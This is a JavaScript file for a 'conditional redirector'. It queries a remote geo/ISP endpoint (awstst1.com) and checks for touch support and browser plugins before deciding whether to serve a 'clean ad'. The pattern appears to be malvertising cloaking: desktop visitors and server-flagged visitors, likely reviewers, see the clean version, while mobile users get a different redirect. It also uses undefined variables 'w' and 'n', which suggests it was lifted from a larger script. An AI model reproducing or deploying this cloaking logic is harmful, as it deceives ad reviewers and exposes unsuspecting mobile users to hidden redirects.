
/*
	Conditional redirector:
	
	Example usage:

			conditionalRedirector.go(
				fn									// function that will be called with the result
			);			
 */

var conditionalRedirector2 = (function()
{		

	/* Query Url */
	var queryUrl = 'http://awstst1.com/geoisp/checkredirectconditions.php';

	/* Get the IP information */
	function checkRedirectConditions(callback) {
		
		var json = null;

		// Create a cross domain request
		var isIE8 = window.XDomainRequest ? true : false;
		var req;

		if (isIE8)
		{
			req = new window.XDomainRequest();
		}
		else
		{
			req = new XMLHttpRequest();
		}		

		req.onreadystatechange = function()
		{
			if (4 == req.readyState && 200 == req.status)
			{
				json = req.responseText;
				var obj = JSON.parse(json);
				callback(obj);
			}
		};

		req.open("GET", queryUrl, true);
		req.send();
	}  
	 
	function isTouchDevice() 
	{
		return (('ontouchstart' in w) 		/* All standard browsers, except IE */
		  || (n.MaxTouchPoints > 0)	|| (n.msMaxTouchPoints > 0)); /* IE browsers */
		/* browser with either Touch Events of Pointer Events running on touch-capable device */			  
	}

	function hasPlugins()
	{
		return n.plugins.length > 0;
	}

	function redirectOn(fn)
	{
		/* Query user information */
		checkRedirectConditions(function(info)
		{
			/* We got all the information we need to take a decision */
			var goClean = false;
			
			/* If no mobile device, redirect to clean ad */
			if (!isTouchDevice() ||
				hasPlugins() ||			// indicates desktop browser
				info.goClean)
			{
				goClean = true;
			}

			fn(goClean);
		});
	}
	
	return { go: redirectOn };

})();